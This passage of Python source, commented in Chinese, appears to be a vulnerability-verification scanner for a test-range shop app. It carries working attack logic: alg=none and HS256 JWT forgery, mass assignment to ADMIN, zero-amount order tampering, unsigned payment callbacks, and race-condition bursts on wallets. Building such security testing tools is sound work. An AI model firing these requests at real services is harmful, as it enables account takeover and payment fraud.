        """垂直越权验证（第一刀 A1：forge 主腿）：低权限攻击者直呼高权端点。

        双主腿，任一被服务端接受（2xx 且无拒绝词）即 confirmed：
        主腿① 普通攻击者 token：缺失「角色/权限校验」型越权（只要登录即可执行高权操作）；
        主腿② alg=none 伪造 + role=admin：缺失「签名算法校验 / role claim 鉴权」型越权

        参数值兜底：高权端点常要求真实 uid/orderId，缺省回落到 victim/attacker 的 uid，
        避免 uid= 空值 → 400 误读为「已鉴权拒绝」。
        """
        spec = dict(trigger_spec or {})
        target = dict(target or {})
        accounts = accounts if isinstance(accounts, dict) else {}
        patched = dict(spec)
        if patched.get("param_name") and not patched.get("param_value"):
            _uid = str((accounts.get("victim") or accounts.get("attacker") or {}).get("user_id") or "2")
            patched["param_value"] = _uid

        plain = self._verify_accepted(patched, target, accounts=accounts, category="vertical_privesc")
        plain_impact = plain["impact"]
        forged_accounts = self._forge_accounts(accounts)
        forged = self._verify_accepted(patched, target, accounts=forged_accounts, category="vertical_privesc") if forged_accounts else None
        forged_impact = forged["impact"] if forged else None

        confirmed = bool(plain["confirmed"] or (forged["confirmed"] if forged else False))
        state = plain.get("request_state")
        if forged and forged.get("request_state") == "accepted" and state != "accepted":
            state = "accepted"

        if confirmed:
            if forged and forged["confirmed"] and not plain["confirmed"]:
                reason = ("alg=none 伪造 + role=admin 令牌被高权端点接受（签名算法降级 / role 声明被后端直接信任），"
                          "缺失角色校验 → 垂直越权确认")
            else:
                reason = "低权限身份请求高权限端点被服务端接受，疑似缺失角色/权限校验 → 垂直越权确认"
        elif state == "auth_missing":
            reason = ("高权限端点返回 401 且带 WWW-Authenticate 挑战头，属鉴权墙（缺凭证），"
                      "需带会话/双账户重放，而非被拦截或存在鉴权控制")
        elif state == "auth_denied":
            reason = "高权限端点对低权限请求返回 401/403，存在鉴权控制"
        elif state == "malformed_request":
            reason = ("请求装配不完整（缺必需字段/值或 Content-Type 错误，返回 400/415），无法判定端点是否鉴权；"
                      "需端点 schema 才能构造合法请求体（entry.params/prerequisites 当前为空）")
        elif state == "server_error":
            reason = "重放触发 5xx 服务端错误，需排查靶场或重试"
        else:
            reason = "高权限端点对低权限请求未返回明确接受，暂无可确认证据"
        return {
            "confirmed": confirmed,
            "verdict": "confirmed" if confirmed else ("no_evidence" if plain_impact.reached else "ambiguous"),
            "status_code": (forged_impact.status_code if (forged and forged_impact) else plain_impact.status_code),
            "request_state": state,
            "response_summary": (forged_impact.response_summary if (forged and forged_impact) else plain_impact.response_summary),
            "heuristic_confirmed": plain.get("heuristic_confirmed"),
            "ai_overlay": plain.get("ai_overlay"),
            "forge_attempted": forged_accounts is not None,
            "plain_confirmed": plain["confirmed"],
            "forge_confirmed": bool(forged["confirmed"]) if forged else False,
            "reason": reason,
        }

    def replay_cross_module(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                            accounts: Any = None) -> Dict[str, Any]:
        """跨模块/跨业务越权验证：以 A 子系统的 Token 请求 B 子系统的内部端点。

        若跨域 Token 直接命中另一模块内部接口并被接受（2xx 且无拒绝词），说明 scope/tenant
        隔离缺失 → confirmed。
        """
        out = self._verify_accepted(trigger_spec, target, accounts=accounts, category="cross_module_privesc")
        impact = out["impact"]
        return {
            "confirmed": out["confirmed"],
            "verdict": "confirmed" if out["confirmed"] else ("no_evidence" if impact.reached else "ambiguous"),
            "status_code": impact.status_code,
            "response_summary": impact.response_summary,
            "heuristic_confirmed": out.get("heuristic_confirmed"),
            "ai_overlay": out.get("ai_overlay"),
            "reason": "跨模块 Token 直接命中另一子系统内部端点并被接受，疑似 scope/tenant 隔离缺失" if out["confirmed"]
                      else "跨模块请求被拒绝或隔离",
        }

    def replay_state_machine(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                             accounts: Any = None) -> Dict[str, Any]:
        """状态机/流程控制验证：在「非法当前状态」下直接调用状态转换端点（如已发货仍取消/改地址）。

        若服务端返回 2xx 且无拒绝词，说明该操作缺失当前状态前置校验 → confirmed。

        spec.ordered_steps 支持：当提供有序状态转换步骤列表时，按序逐个发送
        （前几步建立基线状态，被标记 illegal 的步骤或最后一步为待验证的非法转换），任一步的
        「非法转换被接受」即缺失状态前置校验。无 ordered_steps 时回落单请求验证。
        """
        spec = dict(trigger_spec or {})
        target = dict(target or {})
        _sm_ep = str(spec.get("target_endpoint") or "").lower()
        if "/ship" in _sm_ep and "/order/" in _sm_ep:
            return self._replay_state_skip(spec, target, accounts=accounts)
        steps = spec.get("ordered_steps") or []
        if steps and isinstance(steps, list):
            impacts: List[Dict[str, Any]] = []
            for step in steps:
                step = step if isinstance(step, dict) else {}
                step_spec = dict(spec)
                for k in ("target_endpoint", "http_method", "param_name", "param_location",
                          "param_value", "body", "content_type"):
                    if step.get(k) is not None:
                        step_spec[k] = step[k]
                impacts.append(self._verify_accepted(step_spec, target, accounts=accounts, category="state_machine"))
            # 判定步：显式 illegal 标记，否则取最后一步（典型非法转换在末端）。
            judge_idx = next((i for i, s in enumerate(steps) if s.get("illegal")), len(steps) - 1)
            out = impacts[judge_idx]
            impact = out["impact"]
            return {
                "confirmed": out["confirmed"],
                "verdict": "confirmed" if out["confirmed"] else ("no_evidence" if impact.reached else "ambiguous"),
                "status_code": impact.status_code,
                "response_summary": impact.response_summary,
                "ordered_steps_executed": len(steps),
                "judged_step_index": judge_idx,
                "heuristic_confirmed": out.get("heuristic_confirmed"),
                "ai_overlay": out.get("ai_overlay"),
                "reason": "按 ordered_steps 走到非法/逆向状态转换仍被服务端接受，疑似缺失当前状态前置校验" if out["confirmed"]
                          else "状态转换操作对非法状态做了拒绝或守卫",
            }
        out = self._verify_accepted(trigger_spec, target, accounts=accounts, category="state_machine")
        impact = out["impact"]
        return {
            "confirmed": out["confirmed"],
            "verdict": "confirmed" if out["confirmed"] else ("no_evidence" if impact.reached else "ambiguous"),
            "status_code": impact.status_code,
            "response_summary": impact.response_summary,
            "heuristic_confirmed": out.get("heuristic_confirmed"),
            "ai_overlay": out.get("ai_overlay"),
            "reason": "在非法/逆向状态下调用状态转换操作仍被接受，疑似缺失当前状态前置校验" if out["confirmed"]
                      else "状态转换操作对非法状态做了拒绝或守卫",
        }

    def replay_calculation(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                           accounts: Any = None) -> Dict[str, Any]:
        """计算/交易逻辑验证：将关键数值字段（数量/金额/运费）变异为负数或极值后重放。

        判定：服务端接受变异数值（2xx 且无拒绝词）且响应中出现负数金额（total/amount/price/
        balance/fee 等为负）→ 疑似计算逻辑篡改（负数购买/优惠叠加绕过）→ confirmed。
        """
        spec = dict(trigger_spec or {})
        target = dict(target or {})
        # 第一刀 A2+#25：/profile/update 是批量赋值（Mass Assignment）提权族，不是数值变异。
        # 走专用差分：注入 role=ADMIN 后读回 /api/profile/{uid} 比对 role 是否升高。
        if "/profile/update" in str(spec.get("target_endpoint") or "").lower():
            return self._replay_mass_assignment(spec, target, accounts=accounts)
        _calc_ep = str(spec.get("target_endpoint") or "").lower()
        if "/order/buy" in _calc_ep or "/order/checkout" in _calc_ep:
            return self._replay_amount_tampering(spec, target, accounts=accounts)
        variant = spec.get("variant_value", "-1")
        extra = [(spec.get("param_name"), spec.get("param_location", "body"), variant)] if spec.get("param_name") else []
        method, url, query, headers, cookies, body, ct = self._assemble(target, spec, extra_injections=extra)
        impact = self._send_one(method, url, query, headers, cookies, body, ct)
        body_text = impact.body or ""
        neg_money = bool(re.search(r'"(?:total|amount|price|balance|cost|fee|subtotal|payable)"\s*:\s*-[0-9]', body_text))
        success = any(w in body_text.lower() for w in self.SUCCESS_WORDS)
        accepted = bool(impact.reached and impact.status_code and 200 <= int(impact.status_code) < 300 and not self._denied(body_text))
        heuristic = bool(accepted and (neg_money or (spec.get("expect_negative_on_success") and success)))
        ai = self._ai_overlay_judgement("calculation_logic", spec, impact)
        confirmed = ai if ai is not None else heuristic
        return {
            "confirmed": confirmed,
            "verdict": "confirmed" if confirmed else ("no_evidence" if impact.reached else "ambiguous"),
            "negative_total_observed": neg_money,
            "accepted": accepted,
            "heuristic_confirmed": heuristic,
            "ai_overlay": ai,
            "status_code": impact.status_code,
            "response_summary": impact.response_summary,
            "variant_value": str(variant),
            "reason": ("服务端接受变异数值(%s)且响应出现负数金额，疑似计算逻辑篡改" % variant) if confirmed
                      else "未观测到非预期负数金额（变异被拒或已校验）",
        }

    def _replay_mass_assignment(self, spec: Dict[str, Any], target: Dict[str, Any],
                                accounts: Any = None) -> Dict[str, Any]:
        """第一刀 #25（批量赋值提权）：/profile/update 经 BeanWrapper 把任意请求参数灌入 User，
        可覆盖 role/isVip/balance/password 且 et白名单。

        DAST 差分证明：攻击前读 /api/profile/{uid} 取得 role；以攻击者身份 POST /profile/update
        注入 role=ADMIN（可附带 isVip/balance）；攻击后再读回 role。role 由非 ADMIN 升为 ADMIN
        即确认批量赋值越权（DAST 原生，不卡探针闸门）。uid 取 victim（否则 attacker）账户 user_id。
        """
        from urllib.parse import urljoin
        spec = dict(spec or {})
        target = dict(target or {})
        accounts = accounts if isinstance(accounts, dict) else {}
        victim = accounts.get("victim") or {}
        attacker = accounts.get("attacker") or victim
        # 与回滚同源，保证「投放对象 == 回滚对象」。
        base_url = str(target.get("service_url") or "").rstrip("/")
        headers = dict((attacker or {}).get("auth_headers") or {})
        cookies = dict((attacker or {}).get("auth_cookies") or {})
        uid = self._self_elevation_uid(base_url, accounts, headers, cookies)

        def _role() -> str:
            try:
                r = self._send_one("GET", urljoin(base_url + "/", "api/profile/%s" % uid),
                                   {}, headers, cookies, None, "")
                if r and r.reached and r.body:
                    try:
                        d = json.loads(r.body)
                        if isinstance(d, list) and d:
                            d = d[0]
                        if isinstance(d, dict):
                            return str(d.get("role") or d.get("roleName") or "")
                    except Exception:
                        return ""
            except Exception:
                return ""
            return ""

        before_role = _role()
        body = {"id": uid, "role": "ADMIN", "isVip": "true", "balance": "999999"}
        imp = self._send_one("POST", urljoin(base_url + "/", "profile/update"),
                             {}, headers, cookies, body, "application/x-www-form-urlencoded")
        after_role = _role()
        side_effect = bool(before_role) and before_role.upper() != "ADMIN" and after_role.upper() == "ADMIN"
        confirmed = side_effect
        return {
            "confirmed": confirmed,
            "verdict": "confirmed" if confirmed else ("no_evidence" if (imp.reached if imp else False) else "ambiguous"),
            "mass_assignment_role_elevated": side_effect,
            "observed_side_effect": side_effect,
            "business_confirmed": side_effect,
            "before_role": before_role,
            "after_role": after_role,
            "status_code": (imp.status_code if imp else None),
            "response_summary": (imp.response_summary if imp else ""),
            "reason": ("批量赋值覆盖 role=ADMIN 生效（before=%s → after=%s），垂直提权/账号接管确认" % (before_role, after_role)) if confirmed
                      else "批量赋值未改变 role（已校验或字段不可覆盖）",
        }


    @staticmethod
    def _extract_order_id(imp: Any) -> Optional[str]:
        """从 302 重定向 Location 或响应体提取 /order/{id}。"""
        if imp is None:
            return None
        loc = (getattr(imp, "headers", None) or {}).get("Location") or ""
        m = re.search(r"/order/(\d+)", str(loc))
        if m:
            return m.group(1)
        m = re.search(r"/order/(\d+)", str(getattr(imp, "body", "") or ""))
        return m.group(1) if m else None

    @staticmethod
    def _json_num(body: Any, key: str) -> Optional[float]:
        try:
            d = json.loads(body)
            if isinstance(d, dict) and key in d:
                return float(d[key])
        except Exception:
            return None
        return None

    @staticmethod
    def _json_bool(body: Any, key: str) -> bool:
        try:
            d = json.loads(body)
            if isinstance(d, dict) and key in d:
                return bool(d[key])
        except Exception:
            return False
        return False

    def _read_order_state(self, base_url: str, order_id: Any, headers: Dict[str, str],
                          cookies: Dict[str, str]) -> Dict[str, Any]:
        """读 /order/{id} 解析 orderNo/status/totalAmount/payAmount（HTML 或 JSON，兼容真实靶场与 mock）。"""
        if not order_id:
            return {}
        from urllib.parse import urljoin
        try:
            r = self._send_one("GET", urljoin(base_url + "/", "order/%s" % order_id),
                               {}, dict(headers or {}), dict(cookies or {}), None, "")
        except Exception:
            return {}
        if not r or not r.reached:
            return {}
        text = r.body or ""
        try:
            d = json.loads(text)
            if isinstance(d, dict):
                return {"orderNo": d.get("orderNo"), "status": d.get("status"),
                        "totalAmount": d.get("totalAmount"), "payAmount": d.get("payAmount")}
        except Exception:
            pass
        out: Dict[str, Any] = {}
        m = re.search(r"状态：<span[^>]*>([^<]+)</span>", text)
        out["status"] = m.group(1).strip() if m else None
        m = re.search(r"订单金额：<span[^>]*>¥\s*([\d.]+)</span>", text)
        out["totalAmount"] = m.group(1) if m else None
        m = re.search(r"实付金额：<span[^>]*>¥\s*([\d.]+)</span>", text)
        out["payAmount"] = m.group(1) if m else None
        m = re.search(r"订单\s*<span[^>]*>([^<]+)</span>", text)
        out["orderNo"] = m.group(1).strip() if m else None
        return out

    def _replay_amount_tampering(self, spec: Dict[str, Any], target: Dict[str, Any],
                                 accounts: Any = None) -> Dict[str, Any]:
        """R23 A3 (#30/#31 计算/金额真篡改)：/order/buy、/order/checkout 的 amount 参数直接采信
        （OrderService.buildOrder: payAmount = clientAmount != null ? clientAmount : computed），
        绕过服务端计算。DAST 差分：注入 amount=0（攻击者任意值），下单后读 /order/{id}，
        比对 payAmount 与 totalAmount；payAmount 被篡改为攻击者值（<=0 或 != totalAmount）即确认。"""
        from decimal import Decimal, InvalidOperation
        from urllib.parse import urljoin
        spec = dict(spec or {})
        target = dict(target or {})
        accounts = accounts if isinstance(accounts, dict) else {}
        attacker = accounts.get("attacker") or {}
        base_url = str(target.get("service_url") or "").rstrip("/")
        headers = dict(attacker.get("auth_headers") or {})
        cookies = dict(attacker.get("auth_cookies") or {})
        ep = str(spec.get("target_endpoint") or "order/buy").lstrip("/")
        product_id = str(spec.get("resource_id") or spec.get("param_value") or "1").strip()
        coupon = str(spec.get("coupon_codes") or "").strip()
        tamper_amount = "0"
        q = {"productId": product_id, "quantity": "1", "amount": tamper_amount}
        if coupon:
            q["coupon"] = coupon
        url = urljoin(base_url + "/", ep) if base_url else ("/" + ep)
        imp = self._send_one("POST", url, q, headers, cookies, None, "application/x-www-form-urlencoded")
        order_id = self._extract_order_id(imp)
        if not order_id:
            neg = bool(re.search(r'"(?:total|amount|price|balance|cost|fee)":\s*-[0-9]', imp.body or ""))
            return {"confirmed": neg, "verdict": ("confirmed" if neg else "no_evidence"),
                    "amount_tampering": neg, "observed_side_effect": neg, "business_confirmed": neg,
                    "reason": ("响应出现负数金额（金额篡改）" if neg else "下单未返回可定位订单，无法差分")}
        st = self._read_order_state(base_url, order_id, headers, cookies)
        total = st.get("totalAmount")
        pay = st.get("payAmount")
        side_effect = False
        try:
            if pay is not None and total is not None:
                p = Decimal(str(pay))
                t = Decimal(str(total))
                side_effect = (p <= 0) or (p != t)
        except (InvalidOperation, ValueError):
            side_effect = False
        confirmed = side_effect
        return {
            "confirmed": confirmed,
            "verdict": ("confirmed" if confirmed else "no_evidence"),
            "amount_tampering": side_effect,
            "observed_side_effect": side_effect,
            "business_confirmed": side_effect,
            "before_total": str(total),
            "after_pay": str(pay),
            "reason": ("金额被客户端篡改接管（payAmount=%s，服务端应为 %s），计算逻辑校验缺失确认" % (pay, total)) if confirmed
                      else "金额未被篡改（payAmount 等于服务端计算值）",
        }

    def _replay_state_skip(self, spec: Dict[str, Any], target: Dict[str, Any],
                           accounts: Any = None) -> Dict[str, Any]:
        """R23 A5 (#32 状态机跳步)：/order/{id}/ship 不校验必须先 PAID（OrderService.ship 直接置 SHIPPED）。
        DAST 差分：取一个未付款订单（CREATED），POST /ship 后读 /order/{id}，
        status 由 CREATED 直接变为 SHIPPED（未经 PAID）即确认状态机前置校验缺失。"""
        from urllib.parse import urljoin
        import re as _re
        spec = dict(spec or {})
        target = dict(target or {})
        accounts = accounts if isinstance(accounts, dict) else {}
        attacker = accounts.get("attacker") or {}
        base_url = str(target.get("service_url") or "").rstrip("/")
        headers = dict(attacker.get("auth_headers") or {})
        cookies = dict(attacker.get("auth_cookies") or {})
        ep = str(spec.get("target_endpoint") or "order/1/ship").lstrip("/")
        m = _re.search(r"/order/(\d+)/ship", ep)
        order_id = m.group(1) if m else str(spec.get("resource_id") or spec.get("param_value") or "")
        if not order_id:
            imp = self._send_one("POST", urljoin(base_url + "/", "order/buy"),
                                 {"productId": "1", "quantity": "1"}, headers, cookies, None,
                                 "application/x-www-form-urlencoded")
            order_id = self._extract_order_id(imp)
        before = self._read_order_state(base_url, order_id, headers, cookies) if order_id else {}
        ship_url = urljoin(base_url + "/", "order/%s/ship" % order_id) if order_id else urljoin(base_url + "/", ep)
        self._send_one("POST", ship_url, {}, headers, cookies, None, "application/x-www-form-urlencoded")
        after = self._read_order_state(base_url, order_id, headers, cookies) if order_id else {}
        b = before.get("status")
        a = after.get("status")
        side_effect = bool(b and a and b.upper() != "PAID" and a.upper() == "SHIPPED")
        confirmed = side_effect
        return {
            "confirmed": confirmed,
            "verdict": ("confirmed" if confirmed else "no_evidence"),
            "state_machine_skip": side_effect,
            "observed_side_effect": side_effect,
            "business_confirmed": side_effect,
            "before_status": b,
            "after_status": a,
            "reason": ("状态机跳步确认：订单未经 PAID 直接由 %s 变为 SHIPPED（缺失前置状态校验）" % b) if confirmed
                      else "状态转换符合预期（无跳步）",
        }

    def _race_query(self, ep: str, spec: Dict[str, Any]) -> Dict[str, str]:
        ep = (ep or "").lower()
        if "/seckill" in ep:
            return {"productId": str(spec.get("resource_id") or spec.get("param_value") or "1"),
                    "quantity": str(spec.get("quantity") or "1")}
        if "/coupon/claim" in ep:
            return {"code": str(spec.get("param_value") or spec.get("coupon_code") or "TEST")}
        if "/wallet/withdraw" in ep:
            return {"amount": str(spec.get("param_value") or spec.get("amount") or "1")}
        if "/wallet/transfer" in ep:
            return {"amount": str(spec.get("param_value") or "1"),
                    "toUserId": str(spec.get("to_user_id") or spec.get("toUserId") or "2")}
        return {}

    def _replay_race_endpoint(self, spec, target, accounts, method, url, headers, cookies, body, content_type, n, single_use=None):
        """R23 A4：已知竞态端点专属可观测副作用差分（库存为负/重复领取/余额转负/双重消费）。

        single_use 透传自 replay_race（端点侧无 side-effect 可观测时，仍按设计二② graceful
        降级为「single_use + 并发多成功」并发计数信号，避免确认竞态被静默丢弃）。
        """
        import threading
        from urllib.parse import urljoin
        from decimal import Decimal, InvalidOperation
        spec = dict(spec or {})
        if single_use is None:
            single_use = bool(
                spec.get("race_single_use")
                or _dig(spec.get("raw_json"), "exploit_spec", "race_single_use")
                or spec.get("single_use")
            )
        _ep = str(spec.get("target_endpoint") or "").lower()
        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        attacker = (accounts.get("attacker") if isinstance(accounts, dict) else None) or {}
        h = dict(attacker.get("auth_headers") or dict(headers or {}))
        c = dict(attacker.get("auth_cookies") or dict(cookies or {}))
        q = self._race_query(_ep, spec)
        # before-state
        before = None
        if "/seckill" in _ep:
            probe = self._send_one(method, url, dict(q, quantity="0"), h, c, body, content_type)
            before = self._json_num(probe.body, "remainStock")
        elif "/wallet" in _ep:
            bal = self._send_one("GET", urljoin(base_url + "/", "wallet/balance"), {}, h, c, None, "")
            before = self._json_num(bal.body, "balance")
        # concurrent
        results = []
        lock = threading.Lock()

        def _w():
            imp = self._send_one(method, url, dict(q), h, c, body, content_type)
            with lock:
                results.append(imp)

        nn = max(1, int(n or 1))
        ts = [threading.Thread(target=_w) for _ in range(nn)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        if "/seckill" in _ep:
            stocks = [self._json_num(r.body, "remainStock") for r in results if r.reached]
            ok = [r for r in results if r.reached and self._json_bool(r.body, "ok")]
            oversell = (before is not None and len(ok) > before) or any(s is not None and s < 0 for s in stocks)
            return self._race_out(oversell, "seckill-oversell",
                                  "并发秒杀超卖（剩余库存为负或超量成交）",
                                  {"initial_stock": before, "ok_count": len(ok),
                                   "min_remain": min([s for s in stocks if s is not None], default=0)}, results, single_use)
        if "/coupon/claim" in _ep:
            my = self._send_one("GET", urljoin(base_url + "/", "coupon/my"), {}, h, c, None, "")
            cnt = self._json_num(my.body, "count")
            over = cnt is not None and cnt > 1
            return self._race_out(over, "coupon-overclaim", "并发领券超发（count>1）",
                                  {"claim_count": cnt}, results, single_use)
        if "/wallet/withdraw" in _ep or "/wallet/transfer" in _ep:
            bal2 = self._send_one("GET", urljoin(base_url + "/", "wallet/balance"), {}, h, c, None, "")
            after = self._json_num(bal2.body, "balance")
            try:
                amt = Decimal(str(spec.get("param_value") or "1"))
            except Exception:
                amt = Decimal("1")
            over = False
            try:
                if after is not None and after < 0:
                    over = True
                elif before is not None and after is not None:
                    over = Decimal(str(after)) < (Decimal(str(before)) - amt)
            except (InvalidOperation, ValueError, TypeError):
                over = False
            return self._race_out(over, "wallet-overspend", "并发提现/转账超额扣减（余额转负或双重消费）",
                                  {"before_balance": before, "after_balance": after}, results, single_use)
        return self._race_out(False, "unsupported", "未支持的竞态端点", {}, results, single_use)

    def _race_out(self, confirmed, kind, msg, extra, results, single_use=False):
        """竞态端点专属路径的统一出口。

        必须与 replay_race 通用路径（本文件另一处 return）保持键位一致：race_suspected /
        confirmation_source 两个键此前只有通用路径产出，导致调用方在已知竞态端点
        （/seckill、/coupon/claim、/wallet/*）上用 out.get("race_suspected") 恒为 None，

        修复：endpoint 侧 side-effect 确认（confirmed）与通用「single_use + 并发多成功」信号
        取 OR —— 端点侧无 side-effect 可观测（或无 /coupon/my 响应）时，仍按设计二② graceful
        降级为并发计数确认，避免竞态确认被静默丢弃。
        """
        extra = extra or {}
        success_count = len([r for r in results if getattr(r, "reached", False)])
        endpoint_confirmed = bool(confirmed)
        race_suspected = bool(single_use) and success_count > 1
        confirmed_final = endpoint_confirmed or race_suspected
        confirmation_source = (
            ("endpoint-side-effect:%s" % kind) if endpoint_confirmed
            else "concurrency-double-success" if race_suspected
            else ""
        )
        observed_side_effect = (
            ({"type": kind, **extra} if endpoint_confirmed else None)
            or ({"type": "concurrency-double-success", "single_use": bool(single_use),
                 "success_count": success_count, "concurrency": len(results)} if race_suspected else None)
        )
        return {
            "category": "race",
            "confirmed": confirmed_final,
            "business_confirmed": confirmed_final,
            "confidence": "high" if confirmed_final else "low",
            "race_kind": kind,
            "race_suspected": race_suspected,
            "confirmation_source": confirmation_source,
            "observed_side_effect": observed_side_effect,
            "reason": ("竞态确认（%s）：%s；%s" % (kind, msg, extra)) if endpoint_confirmed
                      else ("竞态确认（concurrency-double-success）：%s；并发成功 %s 次（single_use=%s）"
                            % (msg, success_count, bool(single_use))) if race_suspected
                      else "竞态未确认（%s）：%s" % (kind, msg),
            "success_count": success_count,
            "results": [{"status": r.status_code, "reached": r.reached,
                         "body": (r.body or "")[:200]} for r in results],
        }

    def replay_callback_signature_forgery(self, spec: Dict[str, Any], target: Dict[str, Any],
                                         accounts: Any = None) -> Dict[str, Any]:
        """R23 A6 (#34 回调签名伪造)：/payment/callback 的 signType=none 直接 valid=true（签名降级绕过），
        且金额直接采信。DAST 差分：取一个未付款订单，发 signType=none + 攻击者指定 canary 金额（如 0.01）
        的回调，读回订单应被标记为 PAID 且 payAmount=canary → 签名伪造确认（canary 注入点=攻击者金额）。"""
        from urllib.parse import urljoin
        spec = dict(spec or {})
        target = dict(target or {})
        accounts = accounts if isinstance(accounts, dict) else {}
        attacker = accounts.get("attacker") or {}
        base_url = str(target.get("service_url") or "").rstrip("/")
        headers = dict(attacker.get("auth_headers") or {})
        cookies = dict(attacker.get("auth_cookies") or {})
        ep = str(spec.get("target_endpoint") or "payment/callback").lstrip("/")
        order_id = str(spec.get("resource_id") or spec.get("param_value") or "")
        order_no = None
        before = {}
        if order_id:
            before = self._read_order_state(base_url, order_id, headers, cookies)
            order_no = before.get("orderNo")
        if not order_no:
            imp = self._send_one("POST", urljoin(base_url + "/", "order/buy"),
                                 {"productId": "1", "quantity": "1"}, headers, cookies, None,
                                 "application/x-www-form-urlencoded")
            oid = self._extract_order_id(imp)
            before = self._read_order_state(base_url, oid, headers, cookies) if oid else {}
            order_no = before.get("orderNo")
            order_id = oid or order_id
        if not order_no:
            return {"confirmed": False, "verdict": "no_evidence",
                    "reason": "无法定位未付款订单的 orderNo，无法构造回调伪造",
                    "observed_side_effect": False, "business_confirmed": False}
        canary_amount = "0.01"
        cb = self._send_one("POST", urljoin(base_url + "/", ep),
                            {"orderNo": order_no, "status": "PAID", "amount": canary_amount,
                             "signType": "none"}, headers, cookies, None,
                            "application/x-www-form-urlencoded")
        after = self._read_order_state(base_url, order_id, headers, cookies) if order_id else {}
        forged = (after.get("status") in ("PAID",) and str(after.get("payAmount")) == canary_amount)
        confirmed = forged
        return {
            "confirmed": confirmed,
            "verdict": ("confirmed" if confirmed else "no_evidence"),
            "signature_forged": forged,
            "observed_side_effect": forged,
            "business_confirmed": forged,
            "sign_type_used": "none",
            "canary_amount": canary_amount,
            "before_status": before.get("status"),
            "after_status": after.get("status"),
            "after_pay": str(after.get("payAmount")),
            "callback_accepted": bool(cb.reached and cb.status_code and 200 <= int(cb.status_code) < 300),
            "reason": ("回调签名伪造确认：signType=none 的未签名回调被接受，订单被标记为 PAID 且金额被篡改为攻击者指定的 %s"
                       % canary_amount) if confirmed else "未签名回调未被接受或订单状态未变更",
        }

    def replay_auth_session(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                            accounts: Any = None) -> Dict[str, Any]:
        """认证会话验证：验证码复用 / 密码重置 Token 未绑定用户。

        caller 在 trigger_spec.body 中构造「受害者标识 + 复用/攻击者凭证」的重置请求；若服务端
        返回 2xx 且无拒绝词，说明 Token 未绑定用户或验证码可复用 → confirmed。
        """
        out = self._verify_accepted(trigger_spec, target, accounts=accounts, category="auth_session")
        impact = out["impact"]
        return {
            "confirmed": out["confirmed"],
            "verdict": "confirmed" if out["confirmed"] else ("no_evidence" if impact.reached else "ambiguous"),
            "status_code": impact.status_code,
            "response_summary": impact.response_summary,
            "heuristic_confirmed": out.get("heuristic_confirmed"),
            "ai_overlay": out.get("ai_overlay"),
            "reason": "重置/验证码接口在(受害者标识+复用凭证)下返回成功，疑似 Token 未绑定用户/凭证可复用" if out["confirmed"]
                      else "重置/验证码接口对非法凭证做了拒绝或校验",
        }

    def replay_abuse_dos(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                         concurrency: int = 5, accounts: Any = None) -> Dict[str, Any]:
        """滥用 DoS 验证：对通知发送/批量查询端点高频重放，检查是否缺失频率限制。

        并发 N 个请求全部成功（2xx）且无 429/403 限流响应 → 疑似缺失频率限制 → confirmed。
        """
        import threading
        spec = dict(trigger_spec or {})
        target = dict(target or {})
        method, url, query, headers, cookies, body, ct = self._assemble(target, spec)
        results: List[Dict[str, Any]] = []
        lock = threading.Lock()

        def _worker() -> None:
            imp = self._send_one(method, url, dict(query), dict(headers), dict(cookies), body, ct)
            with lock:
                results.append({"status": imp.status_code, "reached": imp.reached})

        n = max(1, int(concurrency or 1))
        threads = [threading.Thread(target=_worker) for _ in range(n)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        success = [r for r in results if r["reached"] and r["status"] and 200 <= int(r["status"]) < 300]
        throttled = [r for r in results if r["status"] in (429, 403)]
        confirmed = len(throttled) == 0 and len(success) > 0
        return {
            "concurrency": n,
            "results": results,
            "success_count": len(success),
            "throttled_count": len(throttled),
            "rate_limit_absent": confirmed,
            "confirmed": confirmed,
            "verdict": "confirmed" if confirmed else "no_evidence",
            "reason": ("并发 %d 请求全部成功且无 429/403，疑似缺失频率限制" % n) if confirmed
                      else "存在 429/403 限流响应，频率控制生效",
        }

    # ---------------- 第九类：signature_bypass（签名绕过，最正确最慢）----------------
    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    @staticmethod
    def _b64url_decode(seg: str) -> bytes:
        seg = seg + "=" * (-len(seg) % 4)
        return base64.urlsafe_b64decode(seg)

    @staticmethod
    def _forge_none(header: Dict[str, Any], payload: Dict[str, Any]) -> str:
        """alg:none 伪造：去掉签名段，alg 置 none。服务端若不校验签名即接受。"""
        h = D1Service._b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        p = D1Service._b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        return f"{h}.{p}."

    @staticmethod
    def _forge_hs256(header: Dict[str, Any], payload: Dict[str, Any], secret: str) -> str:
        """HS256 伪造（含 RS/ES→HS256 密钥混淆：secret 传公钥 PEM）。"""
        h = D1Service._b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        p = D1Service._b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        sig = hmac.new(secret.encode("utf-8"), f"{h}.{p}".encode("utf-8"), hashlib.sha256).digest()
        return f"{h}.{p}." + D1Service._b64url_encode(sig)

    def replay_signature_bypass(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                               accounts: Any = None) -> Dict[str, Any]:
        """签名绕过验证（第九类，最正确最慢）：系统性尝试 JWT/签名绕过技术重放受保护端点。

        覆盖技术：
        1. alg:none（原 payload / + 提权声明）—— 去掉签名段，alg 置 none；
        2. RS/ES→HS256 密钥混淆 —— 用公开公钥 PEM 作为 HMAC 密钥伪造 HS256；
        3. 原 alg 空签名段（签名置空或随机，服务端若仍接受即缺失校验）；
        4. 弱密钥爆破（内置常见密钥字典，HS256 逐个尝试——最慢的一步；可由 spec.weak_secret_wordlist 扩展）。

        控制组：发送完全非法 token（乱码三段），记录是否被拒，用于区分「仅绕过变体有效」与「完全不校验签名」。

        判定：任一绕过变体被服务端接受（2xx 且无拒绝词）即 confirmed；控制组亦被接受则标注为
        「完全不校验签名」（更弱但同样确认）。所有变体均被拒则 no_evidence。
        """
        spec = dict(trigger_spec or {})
        target = dict(target or {})
        if "/payment/callback" in str(spec.get("target_endpoint") or "").lower():
